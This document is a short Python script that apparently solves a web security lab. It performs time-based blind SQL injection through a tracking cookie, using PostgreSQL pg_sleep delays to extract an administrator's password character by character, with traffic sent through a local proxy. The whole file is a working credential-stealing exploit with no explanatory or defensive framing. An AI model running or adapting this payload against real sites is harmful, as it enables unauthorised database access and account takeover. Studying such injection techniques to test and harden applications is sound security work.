import sys
import urllib.parse
import requests
import urllib, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password = ""
    for idx in range(1, 21):
        for ch in range(32, 126):
            payload = "' || (select case when(username='administrator' and ascii(substring(password,%s,1)) = '%s') then pg_sleep(10) else pg_sleep(0) end from users)--" %(idx, ch)
            payload_encoded = urllib.parse.quote(payload)
            cookies = {'TrackingId':'ixoJ4Nnkx4yVYXoI' + payload_encoded, 'session':'RwNM07Y6rqKc8aJsdoU3SscsiMfxolVE'}
            res = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(res.elapsed.total_seconds()) >= 10:
                password += chr(ch)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password + chr(ch))
                sys.stdout.flush()
    print('\n')

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit()
    url = sys.argv[1]
    sqli_password(url)

if __name__ == '__main__':
    main()